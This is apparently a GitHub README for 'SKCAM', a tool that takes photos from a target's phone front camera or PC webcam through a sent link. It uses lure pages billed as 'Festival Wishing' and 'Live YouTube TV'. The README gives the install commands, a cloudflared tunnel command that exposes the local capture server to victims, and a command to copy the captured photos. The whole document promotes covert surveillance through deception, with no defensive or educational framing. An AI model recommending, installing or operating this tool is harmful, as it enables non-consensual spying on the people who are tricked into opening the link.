# SKCAM
Grab cam shots from target's phone front camera or PC webcam just sending a link.
![cheese](Logo/Camera.png)
## Developer By Sheikh Sabbir 
![cheese](Logo/Logo.jpeg)
## Features
<ul>
  <li>Festival Wishing</li>
  <li>Live YouTube TV</li>
</ul>

## This Tool Tested On :
<ul>
  <li>Kali Linux</li>
  <li>Termux</li>
  <li>MacOS</li>
  <li>Ubuntu</li>
  <li>Perrot Sec OS</li>
</ul>

## Installing (Kali Linux/Termux):

```
apt update -y
apt upgrade -y
apt install cloudflared
apt install  php -y
apt install openssh -y
apt install git -y
termux-setup-storage
apt install wget -y
git clone https://github.com/CyberNet-SK/SKCAM.git
bash skcam.sh
```
## Open new Session
```

cloudflared tunnel --url http://localhost:3333
```
## Save Capture photo 
```
cp *.png ~/storage/shared/
```
